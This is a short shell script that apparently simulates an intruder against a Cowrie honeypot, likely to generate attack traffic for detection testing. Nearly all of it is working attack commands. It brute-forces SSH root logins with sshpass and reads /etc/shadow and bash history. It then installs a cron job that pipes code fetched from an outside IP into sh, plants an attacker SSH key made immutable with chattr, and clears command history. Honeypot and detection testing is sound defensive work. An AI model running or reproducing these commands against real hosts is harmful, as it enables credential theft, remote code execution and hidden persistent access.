# Hands-on-keyboard intruder: brute force, recon, persistence, cover tracks.
for pw in $FAIL_PW; do sshpass -p "$pw" ssh -p "$SSH_P" root@"$COWRIE" true 2>/dev/null; done
sshpass -p letmein ssh -p "$SSH_P" root@"$COWRIE" "
  whoami; id; uname -a; hostname; cat /etc/passwd; cat /etc/shadow;
  ls -la /root; cat /root/.bash_history; netstat -antp; ps aux;
  crontab -l; echo \"*/5 * * * * curl -s http://45.9.148.99/c | sh\" | crontab -;
  mkdir -p /root/.ssh; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker\" >> /root/.ssh/authorized_keys;
  chattr +i /root/.ssh/authorized_keys; history -c; rm -f /root/.bash_history" 2>/dev/null
